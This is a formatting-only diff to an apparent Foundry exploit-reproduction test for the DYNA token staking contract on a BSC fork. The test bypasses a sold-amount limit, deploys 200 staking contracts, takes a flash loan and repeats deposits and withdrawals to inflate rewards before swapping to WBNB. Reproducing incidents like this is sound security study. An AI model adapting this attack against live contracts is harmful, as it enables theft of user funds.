@@ -18,7 +18,7 @@ interface IStakingDYNA {
 
 interface IDYNA is IERC20 {
     function _setMaxSoldAmount(uint256 maxvalue) external;
-    function _maxSoldAmount() external view returns(uint256);
+    function _maxSoldAmount() external view returns (uint256);
 }
 
 contract StakingReward {
@@ -28,7 +28,7 @@ contract StakingReward {
 
     constructor(address owner) {
         Owner = owner;
-        DYNA.approve(address(StakingDYNA), type(uint).max);
+        DYNA.approve(address(StakingDYNA), type(uint256).max);
     }
 
     function deposit(uint256 amount) external {
@@ -55,7 +55,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 25879486);
+        cheats.createSelectFork("bsc", 25_879_486);
         cheats.label(address(DYNA), "DYNA");
         cheats.label(address(WBNB), "WBNB");
         cheats.label(address(Router), "Router");
@@ -66,11 +66,15 @@ contract ContractTest is Test {
     function testExploit() external {
         StakingRewardFactory();
         DYNA.transfer(address(Pair), 1); //
-        DYNA.transfer(tx.origin, 1e17);  //
-        cheats.startPrank(tx.origin);    // Bypass Sold Amount Limit
+        DYNA.transfer(tx.origin, 1e17);
+        //
+        cheats.startPrank(tx.origin);
+        // Bypass Sold Amount Limit
         DYNA.transfer(address(Pair), 1); //
-        cheats.stopPrank();              //
-        cheats.warp(block.timestamp + 7 * 24 * 60 * 60); // deposit a week ago
+        cheats.stopPrank();
+        //
+        cheats.warp(block.timestamp + 7 * 24 * 60 * 60);
+        // deposit a week ago
         flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;
         Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));
         DYNAToWBNB();
@@ -81,7 +85,7 @@ contract ContractTest is Test {
     function StakingRewardFactory() internal {
         deal(address(DYNA), address(this), 1001 * 1e18);
         uint256 preStakingRewardAmount = 1000 * 1e18 / 200;
-        for(uint256 i; i < 200; ++i){
+        for (uint256 i; i < 200; ++i) {
             stakingReward = new StakingReward(address(this));
             DYNA.transfer(address(stakingReward), preStakingRewardAmount);
             stakingReward.deposit(preStakingRewardAmount);
@@ -91,13 +95,13 @@ contract ContractTest is Test {
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         uint256 listLength = StakingRewardList.length;
-        for(uint i; i < listLength; ++i){
+        for (uint256 i; i < listLength; ++i) {
             uint256 amount = DYNA.balanceOf(address(this));
             DYNA.transfer(address(StakingRewardList[i]), amount);
             StakingRewardList[i].deposit(amount);
             StakingRewardList[i].withdraw(amount);
         }
-        DYNA.transfer(address(Pair), flashLoanAmount * 100000 / 9975 / 9 + 1000);
+        DYNA.transfer(address(Pair), flashLoanAmount * 100_000 / 9975 / 9 + 1000);
     }
 
     function DYNAToWBNB() internal {
@@ -112,5 +116,4 @@ contract ContractTest is Test {
         );
         cheats.stopPrank();
     }
-
 }
